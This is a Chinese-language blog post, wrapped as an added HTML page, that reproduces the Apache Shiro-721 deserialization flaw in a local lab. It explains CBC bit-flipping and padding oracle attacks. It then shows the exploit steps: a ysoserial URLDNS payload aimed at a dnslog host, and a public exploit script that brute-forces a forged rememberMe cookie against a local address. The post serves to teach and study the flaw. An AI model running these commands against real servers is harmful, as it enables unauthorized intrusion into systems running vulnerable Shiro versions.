@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shiro反序列化漏洞之shiro721（二） | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">Shiro反序列化漏洞之shiro721（二）</h1>
+    <div class="post-meta">
+      <time datetime="2025-03-13">2025-03-13</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18771096">https://www.cnblogs.com/Zephyr07/articles/18771096</a></p>
+</blockquote>
+<h2 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h2><p>1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p>
+<h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><p>● 开启 rememberMe 功能；<br>● rememberMe 值使用 AES-CBC 模式解密；<br>● 能获取到正常 Cookie，即用户正常登录的 Cookie 值；<br>● 密文可控；</p>
+<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>shiro在550之后就把固定的硬编码的key变成了随机生成的key<br>shiro550之前：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public AbstractRememberMeManager() &#123;</span><br><span class="line">        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        this.cipherService = new AesCipherService();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public AbstractRememberMeManager() &#123;</span><br><span class="line">        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        AesCipherService cipherService = new AesCipherService();</span><br><span class="line">        this.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以在shiro721当中用到了一个密码学的思路，叫做Padding Oracle Attack，而要成功利用他还必须满足<br>● 当爆破的cookie错误的时候，响应包要回显rememberMe&#x3D;deleteMe字段<br>● 当正确的时候，服务端返回正常的响应报文内容</p>
+<h3 id="那到底什么是Padding-Oracle-Attack呢？"><a href="#那到底什么是Padding-Oracle-Attack呢？" class="headerlink" title="那到底什么是Padding Oracle Attack呢？"></a>那到底什么是Padding Oracle Attack呢？</h3><h4 id="CBC-字节翻转攻击："><a href="#CBC-字节翻转攻击：" class="headerlink" title="CBC 字节翻转攻击："></a>CBC 字节翻转攻击：</h4><p>在 CBC 加密模式下，每个明文块在加密前会先与前一个密文块 XOR，然后再进行加密。解密时则反过来：先解密，再与前一个密文块 XOR。由于 XOR 的特性，攻击者如果能修改某一段密文，就能“翻转”解密出来的某些明文字节，实现特定的篡改或注入。</p>
+<h4 id="Padding-Oracle-攻击："><a href="#Padding-Oracle-攻击：" class="headerlink" title="Padding Oracle 攻击："></a>Padding Oracle 攻击：</h4><p>在一些实现中，服务器会在解密后根据填充是否正确给出不同的错误信息（或响应），这就像一个“判 oracle”。攻击者可以通过不断试探并观察填充是否正确，逐字节推断出明文内容。原理是：根据对密文的微小修改以及服务器返回的结果（正确填充或错误填充），可以推断出每个字节的实际值，从而逐步还原整个明文<br>参考：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a><br>如果之前没有接触过的话，还是不太容易理解，我个人也没有理解很透彻，但大致意思就是：<br>在网上找到的大部分文章都是利用Padding Oracle Attack去获取明文，但是在这里，我们需要的是利用一个已知的cookie和利用链去通过Padding Oracle Attack构造恶意的payload，然后再去解密反序列化达到攻击的目的</p>
+<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>idea打开shiro正常启动(记得更换shiro版本大于1.2.5)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250313215023094-1345573249.png"></p>
+<p>然后bp抓包刷新页面即可获得登陆成功的rememberMe 值</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250313215028692-1379945819.png"></p>
+<p>然后用urldns的payload验证漏洞存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-6eca5bc740-1.jar URLDNS &quot;http://5zfnof.dnslog.cn&quot; &gt; payload.class</span><br></pre></td></tr></table></figure>
+
+<p>然后就是用github上的工具进行爆破<br><a target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721">https://github.com/3ndz/Shiro-721</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://192.168.5.3:8081/shiro721_war/account $登陆成功的cookie payload.class</span><br></pre></td></tr></table></figure>
+
+<p>然后把生成的cookie替换原来的remberme之后发包，dns平台就能收到请求</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这个漏洞的利用条件较高，并不算是一个容易利用的漏洞，但是拓展了一条可以打cbc的攻击线</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/03/23/CVE-2025-24813-RCE%E5%A4%8D%E7%8E%B0/" class="prev">← CVE-2025-24813 RCE复现</a>
+    
+    
+      <a href="/2025/03/13/shiro550-%E5%8C%85%E6%8B%AC%E5%8A%A0%E5%AF%86%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-cc%E9%93%BE%E5%92%8CCB%E9%93%BE%E4%B8%A4%E7%A7%8D%E6%89%93%E6%B3%95/" class="next">shiro550（包括加密流程分析，cc链和CB链两种打法）！！！ →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
